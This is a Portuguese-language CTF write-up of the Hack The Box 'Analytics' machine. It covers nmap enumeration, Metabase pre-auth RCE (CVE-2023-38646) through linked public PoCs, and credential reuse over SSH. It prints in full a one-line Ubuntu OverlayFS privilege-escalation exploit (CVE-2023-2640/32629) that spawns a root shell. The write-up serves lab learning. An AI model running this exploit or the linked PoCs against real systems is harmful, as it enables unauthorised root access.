---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Analytics - Facíl
date: 2024-02-07 22:35:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, web, facil, ]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/analytics.png){: w="100" h="100" .left}

---
# **CTF - Analytics**
---
---
## **Enumeração**

### nmap

```shell
╭─      ~/HTB/analytics      
╰─ sudo nmap -sV -Pn -sS  --min-rate 5000 -stats-every 7s -p- 10.10.11.233 -oN nmap
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-04 20:30 -03
Nmap scan report for 10.10.11.233
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.39 seconds
```
{: .nolineno }
Domínios adicionado ao `/etc/hosts`  
10.10.11.233    analytical.htb data.analytical.htb  
Porta 80 esse site e página de login em data.analytical.htb  
![alt text](/assets/img/analytics1.png)
data.analytical.htb
![alt text](/assets/img/analytics2.png)

**ffuf nada encontrado.**

## **Acesso**
Pesquisa por Metabase exploit encontrado `CVE-2023-38646 POC`  
<https://github.com/shamo0/CVE-2023-38646-PoC>  
<https://github.com/m3m0o/metabase-pre-auth-rce-poc>

### reverse shell
Seguindo os sites sobre o exploit acima, acessei o endereço para pegar o token.
![alt text](/assets/img/analytics3.png)  

Executando o exploit e recebendo reverse shell.  

![alt text](/assets/img/analytics4.png)

Rodei o Linpeas e de acordo com ele estamos dentro de um docker.
![alt text](/assets/img/analytics5.png)

Retornou também essas credenciais.  
Usando o comando env também é retornado essas credenciais.
![alt text](/assets/img/analytics6.png)  

### Primeira Flag
Tentando usar as credencias via ssh conectou com sucesso.  
Ao logar ja tem a primeira flag.  

![alt text](/assets/img/analytics7.png)

## **Escalação de privilégio**

Sem acesso a sudo

```shell
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics: 
Sorry, user metalytics may not run sudo on localhost.
```
{: .nolineno }
Executei suid3num 

```shell
[#] SUID Binaries found in GTFO bins..                                                      
------------------------------                              
[!] None :(      
------------------------------ 
```     
{: .nolineno }
Rodei o linpeas chequei algumas coisas e nada, ao pesquisar pela versão do linux "Ubuntu 22.04.3 LTS exploit" encontrei esse site:
<https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629>

Acabei me lembrando que na box hospital tem o mesmo CVE.
Não precisa colocar o exploit na maquina, apenas abra ele e copie a última linha e execute no terminal, depois de executar use rm /var/tmp/bash, o exploit cria um bash com SUID, e caso tenha mais pessoas na box pode achar que a  solução e por esse bash com SUID, ou apenas use esse comando abaixo:  
`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"`
### Segunda Flag
![alt text](/assets/img/analytics8.png)

**Conhecimentos aquiridos:**
- Sobre CVE do metabase
- Identificar que está em um docker
- Sempre checar o básico antes, buscar por vulnerabilidade do Kernel Version e Linux version.
  
![alt text](/assets/img/analytics9.png)